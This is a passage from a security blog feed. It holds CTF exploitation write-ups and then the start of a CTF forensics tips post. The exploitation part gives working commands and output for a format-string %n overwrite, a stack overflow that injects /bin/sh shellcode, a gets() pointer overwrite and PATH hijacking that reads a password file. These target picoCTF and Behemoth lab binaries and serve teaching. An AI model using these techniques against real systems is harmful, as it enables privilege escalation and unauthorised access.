</pre></td><td class='code'><pre><code class=''><span class='line'>for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
</span><span class='line'>Offset: 103:AAAA41414141</span></code></pre></td></tr></table></div></figure>
It looks like the address 0x0804a030 is getting placed in *ptr. That’s the address we need to use in place of our A’s. In order to place the number 1337 into secret’s memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico1139@shell:/home/format$ env -i ./format $(python -c 'print "\x30\xa0\x04\x08"+"%1333u%103$nAA"')
</span><span class='line'>$ id
</span><span class='line'>uid=11066(pico1139) gid=1008(format) groups=1017(picogroup)
</span><span class='line'>$ ls
</span><span class='line'>Makefile  flag.txt  format  format.c
</span><span class='line'>$ cat flag.txt
</span><span class='line'>who_thought_%n_was_a_good_idea?</span></code></pre></td></tr></table></div></figure>
Otherwise as the address at the seventh is already present on stack we can also do
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/format$ ./format "%1337u%7\$n"</span></code></pre></td></tr></table></div></figure>
We used DMA to access the memory, so written 1337 directly at the address pointed by the 7th position. Otherwise, we can use the basic 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./format %08x.%08x.%08x.%08x.%08x.%1292u%n</span></code></pre></td></tr></table></div></figure>
If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see "%08x." is of eight characters + 1 of "." or 9 bytes, used five times i.e 9*5=45 bytes and 1292+45 == 1337.

</li>

<li>
In another example below,
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define BUFSIZE 256</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">greet</span><span class="p">(</span><span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What is your name?&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello, %s</span><span class="se">\n</span><span class="s">!&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>
</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;How long is your name?&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">BUFSIZE</span><span class="p">)</span> <span class="c1">//don&#39;t allow buffer overflow</span>
</span><span class='line'>        <span class="n">greet</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Length was too long!&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no_overflow can be used to find if there's any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">no_overflow</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">268</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\xd0\xd6\xff\xff</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">200</span><span class="o">+</span><span class="s">&quot; &quot;</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xc9</span><span class="err">\</span><span class="n">xf7</span><span class="err">\</span><span class="n">xe1</span><span class="err">\</span><span class="n">x51</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x73</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x69</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe3</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x0b</span><span class="err">\</span><span class="n">xcd</span><span class="err">\</span><span class="n">x80</span><span class="s">&quot;&#39;; cat) | ./no_overflow</span>
</span><span class='line'><span class="n">How</span> <span class="kt">long</span> <span class="n">is</span> <span class="n">your</span> <span class="n">name</span><span class="o">?</span>
</span><span class='line'><span class="n">What</span> <span class="n">is</span> <span class="n">your</span> <span class="n">name</span><span class="o">?</span>
</span><span class='line'><span class="n">Hello</span><span class="p">,</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAA</span><span class="p">...</span><span class="n">snip</span><span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="n">id</span>
</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">11066</span><span class="p">(</span><span class="n">pico1139</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">no_overflow</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1017</span><span class="p">(</span><span class="n">picogroup</span><span class="p">)</span>
</span><span class='line'><span class="n">cat</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">what_is_your_sign</span>
</span></code></pre></td></tr></table></div></figure>
</li>

<li>
In an another example where stack is not executable, If you read the code, you would find, we need to change the file_name from not_the_flag.txt to flag.txt. In this example, they provided the address of the string "not_the_flag.txt" as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) br *puts
</span><span class='line'>Breakpoint 1 at 0x8048460
</span><span class='line'>(gdb) run
</span><span class='line'>Starting program: /home/what_the_flag/what_the_flag 
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0xf7e81ee0 in puts () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) x/s 0x08048777
</span><span class='line'>0x8048777:    "not_the_flag.txt"
</span><span class='line'>(gdb) x/s 0x08048778
</span><span class='line'>0x8048778:    "ot_the_flag.txt"
</span><span class='line'>(gdb) x/s 0x08048770
</span><span class='line'>0x8048770:    "le: %s"
</span><span class='line'>(gdb) x/s 0x0804877C
</span><span class='line'>0x804877c:    "he_flag.txt"
</span><span class='line'>(gdb) x/s 0x0804877D
</span><span class='line'>0x804877d:    "e_flag.txt"
</span><span class='line'>(gdb) x/s 0x0804877E
</span><span class='line'>0x804877e:    "_flag.txt"
</span><span class='line'>(gdb) x/s 0x0804877F
</span><span class='line'>0x804877f:    "flag.txt"
</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">message_data</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">message</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">file_name</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">read_file</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file_path</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">file</span><span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fclose</span><span class="p">(</span><span class="n">file</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;Cannot read file: %s&quot;</span><span class="p">,</span> <span class="n">file_path</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">message_data</span> <span class="n">data</span><span class="p">;</span>
</span><span class='line'>    <span class="n">data</span><span class="p">.</span><span class="n">file_name</span> <span class="o">=</span> <span class="s">&quot;not_the_flag.txt&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter your password too see the message:&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">gets</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="s">&quot;1337_P455W0RD&quot;</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">read_file</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">file_name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">));</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">message</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Incorrect password!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

So we’ll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()’s manual:

gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (‘\0’). No check for buffer overrun is performed (see BUGS below).

So by using the following input, we can overwrite the file pointer and still provide the correct password:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1337_P455W0RD
</span><span class='line'>1337_P455W0RD\0aa\x7f\x87\x04\x08
</span><span class='line'>aa\x7f\x87\x04\x08</span></code></pre></td></tr></table></div></figure>
We use this in the command line to get the flag
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pico83515@shell:/home/what_the_flag$ printf "1337_P455W0RD\0bb\x7f\x87\x04\x08" | ./what_the_flag
</span><span class='line'>Enter your password too see the message:
</span><span class='line'>Congratulations! Here is the flag: who_needs_%eip
</span><span class='line'>
</span><span class='line'>pico83515@shell:/home/what_the_flag$</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>Miscellanous Examples:</h3>

<p>Let&rsquo;s see some miscellanous examples away from Buffer/Format Vulnerabilities.</p>

<ol>
<li>So, we have a binary which when executed gives
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth2@melinda:/behemoth$ ./behemoth2 
</span><span class='line'>touch: cannot touch '13373': Permission denied</span></code></pre></td></tr></table></div></figure>
Let's see what ltrace provides us
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth2@melinda:/behemoth$ ltrace ./behemoth2 
</span><span class='line'>__libc_start_main(0x804856d, 1, 0xffffd794, 0x8048640 &lt;unfinished ...&gt;
</span><span class='line'>getpid()                                                                                                               = 14118
</span><span class='line'>sprintf("touch 14118", "touch %d", 14118)                                                                              = 11
</span><span class='line'>__lxstat(3, "14118", 0xffffd688)                                                                                       = -1
</span><span class='line'>unlink("14118")                                                                                                        = -1
</span><span class='line'>system("touch 14118"touch: cannot touch '14118': Permission denied
</span><span class='line'> &lt;no return ...&gt;
</span><span class='line'>--- SIGCHLD (Child exited) ---
</span><span class='line'>&lt;... system resumed&gt; )                                                                                                 = 256
</span><span class='line'>sleep(2000</span></code></pre></td></tr></table></div></figure>
Let's see a truncated output of disassemble main, if we see getpid gets the binary pid, sprintf something in some buffer, lstat provides the file status, unlink -call the unlink function to remove the specified file. 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) disassemble main 
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x08048588 &lt;+27&gt;:    call   0x8048410 &lt;getpid@plt&gt;
</span><span class='line'>   0x080485b3 &lt;+70&gt;:    call   0x8048450 &lt;sprintf@plt&gt;
</span><span class='line'>   0x080485c7 &lt;+90&gt;:    call   0x80486c0 &lt;lstat&gt;
</span><span class='line'>   0x080485df &lt;+114&gt;:   call   0x8048400 &lt;unlink@plt&gt;
</span><span class='line'>   0x080485eb &lt;+126&gt;:   call   0x8048420 &lt;system@plt&gt;
</span><span class='line'>   0x080485f7 &lt;+138&gt;:   call   0x80483e0 &lt;sleep@plt&gt;
</span><span class='line'>   0x08048616 &lt;+169&gt;:   call   0x8048420 &lt;system@plt&gt;
</span><span class='line'>   0x08048635 &lt;+200&gt;:   leave  
</span><span class='line'>   0x08048636 &lt;+201&gt;:   ret </span></code></pre></td></tr></table></div></figure>
If you check the ltrace output
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>system("touch 14118"touch: cannot touch '14118': Permission denied</span></code></pre></td></tr></table></div></figure>
touch is being called without an absolute path, so we can take advantage of that. First we’ll create our own touch script that prints out the contents /etc/behemoth_pass/behemoth3. Next, the PATH variable needs to be updated so that it looks at the current working directory first to ensure that our touch script is executed and not the actual touch program. PATH=/tmp:$PATH, you set /tmp to your primary location to search for binaries and the like... so if you create a file in /tmp/ called touch, it'll actually execute that instead of /usr/bin/touch
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>behemoth2@melinda:/tmp/rahul2$ cat touch 
</span><span class='line'>cat /etc/behemoth_pass/behemoth3
</span><span class='line'>behemoth2@melinda:/tmp/rahul2$ history | grep PATH
</span><span class='line'>   19  history | grep PATH
</span><span class='line'>behemoth2@melinda:/tmp/rahul2$ PATH=/tmp/rahul2:$PATH /behemoth/behemoth2 
</span><span class='line'>**********</span></code></pre></td></tr></table></div></figure>


</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Forensics]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/08/learning-from-ctf-forensics/"/>
    <updated>2014-11-08T03:37:09+05:30</updated>
    <id>http://bitvijays.github.io/blog/2014/11/08/learning-from-ctf-forensics</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Forensics challenges during various CTF&rsquo;s.</p>

<!-- more -->


<ol>
<li>If you are provided a <strong>jar</strong> file in the challenge, JAR (Java ARchive) is a package file format typically used to aggregate many Java class files and associated metadata and resources (text, images, etc.) into one file to distribute application software or libraries on the Java platform. It can be extracted using 

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>jar xf jar-file
</span><span class='line'>
</span><span class='line'>x : extract files from the JAR archive.
</span><span class='line'>f : JAR file from which files are to be extracted is specified on the command line, rather than through stdin.
</span><span class='line'>The jar-file argument is the filename (or path and filename) of the JAR file from which to extract files.</span></code></pre></td></tr></table></div></figure>
</li>

<li>Wireshark - Searching for answers in pcap file? 
<ul>
<li>Searching passwords in HTTP Web traffic in wireshark? http.request.method == "POST" filter might help, based on concept that server is asking for LOGIN prompt and user is POSTing his password in cleartext.</li>
<li>If the challenge says IP address has been spoofed, then you should look for MAC address as it wouldn't have changed. You would find packets with two different IP address having same MAC address. In another scenario, if the MAC address has been spoofed, IP address might be the same. In both cases display filter "arp" (to only show arp requests) and "ip.addr==<IP address>" (to show only packets with either source or destination being the IP address). might be helpful.</li>
<li>Sometimes, it is better to check which objects we are able to export, (File --> Export Objects --> HTTP/DICOM/SMB/SMB2) export the http/DICOM/SMB/SMB2 object </li>
<li>Sometimes, you need to find all the unique ip address in the network capture, for that you can use 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tshark -T fields -e ip.src -r &lt; pcap file&gt; | sort | uniq
</span><span class='line'>
</span><span class='line'>-T fields|pdml|ps|psml|text : Set the format of the output when viewing decoded packet data.
</span><span class='line'>-e &lt;field&gt;              : Add a field to the list of fields to display if -T fields is selected.
</span><span class='line'>-r &lt;pcap file&gt;          : Read packet data from infile, can be any supported capture file format (including gzipped files).
</span><span class='line'>-R &lt;Read filter&gt;            : Cause the specified filter (which uses the syntax of read/display filters, rather than that of capture filters) to be applied</span></code></pre></td></tr></table></div></figure></li>
<li>wireshark can not reassamble HTTP fragmented packets to generate the RAW data,we can use Dshell to reassemble http partial contents. A blog mentioning how to do it is <a href="https://github.com/naijim/blog/blob/master/writeups/asis-quals-ctf-2015_broken_heart_writeup.md">here</a></li>
</ul>
</li>
<br>
<li>If in a challenge, you are provided a setgid program which is able to read a certain extension files and flag is present in some other extension, create a symbolic link to the flag with the extension which can be read by the program. For example: In picoCTF 2014 Supercow challenge, a program named supercow was able to read files with .cow extension only and flag was present with flag.txt. So we created a symbolic link like ln -s flag.txt flag.cow</li>
<br>
<li>If in a challenge, you are provided with a <b>APK</b> file. There are three ways to decompile it as described below:
<ul>
<li>Apktool:
It is used to decode resources to nearly original form (including resources.arsc, XMLs and 9.png files) and rebuilding them. Also, used for smali debugging.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apktool d file.apk output-dir
</span><span class='line'>d : decode to output-dir</span></code></pre></td></tr></table></div></figure>
apktool converts the apk file in to smali format. smali/baksmali is an assembler/disassembler for the dex format used by dalvik, Android's Java VM implementation.
</li>
<li>Dex2jar: To see the java code (approx)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1. Change the extension of file.apk from .apk to .zip
</span><span class='line'>2. Unzip the file.zip 
</span><span class='line'>3. After unzip, you would get classes.dex file.
</span><span class='line'>4. Use dex2jar classes.dex (It would create classes_dex2jar.jar file)
</span><span class='line'>5. Extract jar file by jar xf classes_dex2jar.jar
</span><span class='line'>6. This would provide you with .class files which could be open by jd-gui (Java Decompiler) tool. </span></code></pre></td></tr></table></div></figure>
</li>

<li>Use online services such as <a href="http://www.decompileandroid.com/">Decompile Android</a>. Once it's decompiled, we can download the decompiled files and unpack them. </li>

</ul>
</li>
<br>
<li>If you are provided a <b>disk.img</b> file, from which files have to recovered, you could use foremost tool used to recover files using their headers, footers, and data structures.</li>
<br>
<li>If you are having a source code of evil program, check the source code of the real program, do a comparision and find the added evil code.</li>
<br>
<li>If you are looking for <b>hidden flag in an image</b> first check with file, exiftool command, and make sure the extension is correctly displayed. After that check the image file with hexdump -C and look for interesting pattern may be? If you get 7z or PK they represent Zipped files. If so, you can extract those file with 7z x <image_file>. If somehow, you get a passphrase for the image, then you might have to use steghide tool as it allows to hide data with a passphrase.</li>
<br>
<li>Sometimes, if you extract some files, if you wuld see a blank name, you know there is some file but can't see a name, like file name could be spaces?, then 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lb might be of help.
</span><span class='line'>-b, --escape :   print C-style escapes for nongraphic characters
</span></code></pre></td></tr></table></div></figure> 

How to open a filename named "-"

We can create a file named "-" by 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo hello &gt; -</span></code></pre></td></tr></table></div></figure>
and this file can be opened by
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat ./-</span></code></pre></td></tr></table></div></figure>
This is needed because lot of programs use "-" to mean stdin/stdout.
</li>

<li>If you have a hex dump of something and you want to create the binary version of the data?
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xxd -r &lt;data&gt;
</span><span class='line'>&lt;data&gt; is the hexdump of the binary file.</span></code></pre></td></tr></table></div></figure> </li>

<li>Excel Document: You may try unzipping it and check VBA macros in it. There are tools to extract VBA from excel listed here <a href="http://www.decalage.info/vba_tools">ools to extract VBA Macro source code from MS Office Documents
</a> </li>
<li> Correct Headers:
SQLite3
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0000000: 5351 4c69 7465 2066 6f72 6d61 7420 3300  SQLite format 3.
